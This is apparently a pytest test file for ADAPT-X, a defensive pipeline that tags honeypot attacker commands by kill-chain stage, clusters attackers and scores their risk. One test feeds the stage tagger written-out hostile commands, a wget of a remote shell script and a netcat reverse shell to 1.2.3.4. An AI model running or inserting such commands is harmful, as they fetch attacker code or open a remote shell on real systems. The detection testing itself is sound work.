"""
Basic sanity tests for the ADAPT-X pipeline.
Run with: pytest tests/
"""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import pandas as pd
import pytest

from adaptx.data_generator import generate_dataset, sessions_to_records
from adaptx.killchain import MarkovStagePredictor, tag_stage, STAGES
from adaptx.features import build_attacker_features
from adaptx.profiling import cluster_attackers
from adaptx.risk import score_attackers
from adaptx.pipeline import run_pipeline


def test_data_generator_produces_sessions():
    sessions = generate_dataset(n_sessions=20, seed=1)
    assert len(sessions) == 20
    assert all(s.events for s in sessions)


def test_tag_stage_known_commands():
    assert tag_stage("whoami") == "recon"
    assert tag_stage("wget http://1.2.3.4/x.sh") == "delivery"
    assert tag_stage("crontab -e") == "installation"
    assert tag_stage("nc -e /bin/sh 1.2.3.4 4444") == "c2"
    assert tag_stage("") == "recon"


def test_markov_predictor_fits_and_predicts():
    seqs = [["recon", "delivery", "exploitation"], ["recon", "exploitation"]]
    predictor = MarkovStagePredictor()
    predictor.fit(seqs)
    preds = predictor.predict_next("recon")
    assert len(preds) >= 1
    assert preds[0][0] in STAGES


def test_feature_extraction_shape():
    sessions = generate_dataset(n_sessions=30, seed=2)
    records = sessions_to_records(sessions)
    df = pd.DataFrame(records)
    df["ts"] = pd.to_datetime(df["ts"])
    feat_df = build_attacker_features(df)
    assert "src_ip" in feat_df.columns
    assert "stage_sequence" in feat_df.columns
    assert len(feat_df) > 0


def test_clustering_assigns_archetypes():
    sessions = generate_dataset(n_sessions=40, seed=3)
    records = sessions_to_records(sessions)
    df = pd.DataFrame(records)
    df["ts"] = pd.to_datetime(df["ts"])
    feat_df = build_attacker_features(df)
    profiled = cluster_attackers(feat_df, n_clusters=3)
    assert "archetype" in profiled.columns
    assert profiled["archetype"].notna().all()


def test_risk_scoring_range():
    sessions = generate_dataset(n_sessions=40, seed=4)
    records = sessions_to_records(sessions)
    df = pd.DataFrame(records)
    df["ts"] = pd.to_datetime(df["ts"])
    feat_df = build_attacker_features(df)
    profiled = cluster_attackers(feat_df, n_clusters=3)
    scored = score_attackers(profiled)
    assert scored["risk_score"].between(0, 100).all()
    assert set(scored["risk_level"].unique()).issubset({"Low", "Medium", "High", "Critical"})


def test_full_pipeline_end_to_end():
    result = run_pipeline(source="synthetic", n_sessions=60, seed=7, n_clusters=3)
    expected_cols = {"src_ip", "archetype", "risk_score", "risk_level",
                      "current_stage", "predicted_next_stage"}
    assert expected_cols.issubset(result.columns)
    assert len(result) > 0
    # Sorted descending by risk
    assert list(result["risk_score"]) == sorted(result["risk_score"], reverse=True)


if __name__ == "__main__":
    sys.exit(pytest.main([__file__, "-v"]))
